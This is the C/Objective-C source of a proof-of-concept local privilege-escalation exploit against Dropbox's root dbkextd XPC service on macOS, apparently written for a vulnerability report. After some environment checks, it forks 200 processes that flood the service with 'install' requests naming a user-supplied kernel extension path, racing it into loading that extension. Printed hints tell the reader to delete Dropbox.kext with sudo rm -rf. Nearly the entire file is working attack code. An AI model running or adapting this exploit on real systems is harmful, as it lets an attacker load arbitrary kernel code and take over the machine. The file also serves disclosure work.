#import <Foundation/Foundation.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <sys/types.h> 

using namespace std;

int main(int argc, const char * argv[], char *envp[]) {

    char* MAGIC_PATH = getenv("PWD");
    printf("[+] PWD: %s\n", MAGIC_PATH);
    char SrcPath[0x1000];
    memset(SrcPath, 0, 0x1000);
    snprintf(SrcPath, 0x1000, "%s/%s", MAGIC_PATH, argv[1]);
    printf("[+] PATH: %s\n",SrcPath);

    puts("[+] Checking Your Environment ......");
    FILE *stream = NULL;
    char buf[1024];
    stream = popen("ps aux|grep dbkext|awk '{print $1}'|xargs echo", "r");
    fgets(buf, sizeof(buf), stream);
    string tmpStr1(buf);
    if(tmpStr1.find("root")==tmpStr1.npos){
        printf("[-] Error: No dbkextd Service, check your professional account and wait for a while !\n");
        puts("--------------------------------------------");
        exit(-1);
    }

    stream = popen("file /Applications/Dropbox.app/Contents/PlugIns/garcon.appex/Contents/MacOS/garcon", "r");
    fgets(buf, sizeof(buf), stream);
    string tmpStr2(buf);
    if(tmpStr2.find("executable")==tmpStr2.npos){
        printf("[-] Error: No garcon binary !\n");
        puts("--------------------------------------------");
        exit(-1);
    }

    stream = popen("codesign -dvvv /Library/Extensions/Dropbox.kext 2>&1|grep Executable=", "r");
    fgets(buf, sizeof(buf), stream);
    string tmpStr3(buf);
    if(tmpStr3.find("/Library/Extensions/")!=tmpStr3.npos){
        printf("[-] Error: The Dropbox exists in /Library/Extensions/ !\n");
        printf("         : Pleseae notice the version check I mentioned in my original report.\n");
        printf("         : In macOS(>=11.x), there is no Dropbox.kext in /Library/Extensions/, you don't need to bypass it.\n");
        printf("         : In macOS(< 11.x), there is a Dropbox.kext in /Library/Extensions/, you can use the race conditon I mentioned in my original report to bypass it.\n");
        printf("         : For reproduce easily, I suggested you just \"sudo rm -rf /Library/Extensions/Dropbox.kext\".\n"); 
        puts("--------------------------------------------");    
        exit(-1);  
    }

    char dst[0x1000];
    snprintf(dst, 0x1000, "codesign -dvvv \"%s\" 2>&1| grep \"Identifier=com\"",SrcPath);
    //puts(dst);
    stream = popen(dst, "r");
    fgets(buf, sizeof(buf), stream);
    string tmpStr5(buf);
    if(tmpStr5.find("Identifier=com.getdropbox.dropbox.kext")==tmpStr5.npos){
        printf("[-] Error: The Source DropBox's Extension doesn't exist !\n");
        puts("--------------------------------------------");
        exit(-1);
    }

    puts("[+] Start the Exploit");
      
    for (int i = 0; i < 200; i++) {
        if (fork() == 0) {
            
            char *serviceName = "com.getdropbox.dropbox.dbkextd";

            xpc_connection_t conn;
            xpc_object_t msg;
           
            conn = xpc_connection_create_mach_service(serviceName, NULL, 0);
            if (conn == NULL) {
                perror("xpc_connection_create_mach_service");
            }

            xpc_connection_set_event_handler(conn, ^(xpc_object_t obj) {
                perror("xpc_connection_set_event_handler");
            });

            xpc_connection_resume(conn);

            msg = xpc_dictionary_create(NULL, NULL, 0);

            xpc_dictionary_set_string(msg, "action", "install");
            // The path to the renamed DropBox.kext
            xpc_dictionary_set_string(msg, "path", SrcPath);

            char *_argv[] = {"/Applications/Dropbox.app/Contents/PlugIns/garcon.appex/Contents/MacOS/garcon", 0};
            xpc_connection_send_message_with_reply(conn, msg, DISPATCH_TARGET_QUEUE_DEFAULT, ^(xpc_object_t  _Nonnull object) {});
            xpc_connection_send_message_with_reply(conn, msg, DISPATCH_TARGET_QUEUE_DEFAULT, ^(xpc_object_t  _Nonnull object) {});
            xpc_connection_send_message_with_reply(conn, msg, DISPATCH_TARGET_QUEUE_DEFAULT, ^(xpc_object_t  _Nonnull object) {});
            xpc_connection_send_message_with_reply(conn, msg, DISPATCH_TARGET_QUEUE_DEFAULT, ^(xpc_object_t  _Nonnull object) {});
            xpc_connection_send_message_with_reply(conn, msg, DISPATCH_TARGET_QUEUE_DEFAULT, ^(xpc_object_t  _Nonnull object) {});
            execve(_argv[0], &_argv[0], envp);
            
        }
    }

    exit(0);
}